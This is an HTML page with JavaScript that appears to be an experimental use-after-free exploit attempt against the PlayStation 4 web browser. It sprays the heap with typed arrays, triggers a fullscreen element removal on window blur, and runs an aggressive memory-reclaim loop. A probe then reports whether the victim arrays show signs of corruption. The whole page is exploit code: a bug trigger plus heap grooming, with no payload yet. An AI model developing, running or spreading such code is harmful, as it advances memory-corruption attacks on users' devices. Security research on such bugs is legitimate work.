<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Aggressive Reclaim (FIEL)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>Aggressive Reclaim (Original + Probe)</h2>
<button onclick="run()">Run</button>

<div id="log"></div>

<script>
function log(msg){
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

function setupHeap(){
    let controllers = [];
    for(let i = 0; i < 5000; i++){
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

function setupFS(){
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
    fsTarget.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen();
    return fsTarget;
}

// 🔴 SEU aggressive reclaim (preservado)
function aggressiveReclaimLoop(){

    let running = true;

    function loop(){
        if (!running) return;

        let tmp = [];

        for(let i = 0; i < 2000; i++){

            // TypedArray
            let f64 = new Float64Array(10);
            f64[0] = 13.37;

            // Uint32
            let u32 = new Uint32Array(10);
            u32[0] = 0x41414141;

            // String
            let str = "REUSE_" + i + "_" + Math.random();

            // DOM
            let div = document.createElement("div");
            div.textContent = str;

            tmp.push(f64);
            tmp.push(u32);
            tmp.push(str);
            tmp.push(div);
        }

        // pressão GC (igual padrão)
        tmp = null;

        setTimeout(loop, 0);
    }

    loop();

    return () => { running = false; };
}

// 🔬 PROBE PASSIVO (não interfere)
function passiveProbe(victims){

    let anomalies = 0;

    for(let i = 0; i < victims.length; i++){
        let v = victims[i];

        try {
            if (v.length !== 8 || v.byteLength !== 64){
                anomalies++;
            }
        } catch(e){
            anomalies++;
        }
    }

    if (anomalies > 0){
        log("[!] POSSÍVEL CORRUPÇÃO: " + anomalies);
    }
}

function trigger(fsTarget){
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e){
        log("[ERRO] " + e);
    }

    // 🔴 NÃO MEXER
    setTimeout(() => location.reload(), 500);
}

function run(){
    log("Running... Press OPTIONS");

    let victims = setupHeap();
    let fsTarget = setupFS();

    window.onblur = function(){
        log("[*] onblur");

        setTimeout(() => {

            // 🔴 INICIO da janela crítica (INALTERADO)
            let stop = aggressiveReclaimLoop();

            // 🔬 probe leve rodando junto
            let probeInterval = setInterval(() => {
                passiveProbe(victims);
            }, 50);

            setTimeout(() => {
                trigger(fsTarget);

                clearInterval(probeInterval);
                stop();

            }, 50);

        }, 3000);
    };
}
</script>

</body>
</html>
